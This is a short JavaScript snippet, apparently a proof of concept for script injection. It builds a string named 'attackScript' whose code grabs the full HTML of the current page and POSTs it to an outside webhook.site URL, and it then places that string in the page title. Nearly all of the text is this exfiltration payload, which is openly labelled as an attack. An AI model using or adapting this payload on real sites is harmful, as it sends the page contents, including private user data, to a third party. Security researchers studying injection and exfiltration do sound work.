let tab = window;
var attackScript = "var html = document.documentElement.outerHTML; var server = new XMLHttpRequest;server.open('POST', 'https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c/html=' + encodeURIComponent(html));server.send();"
tab.document.title = attackScript;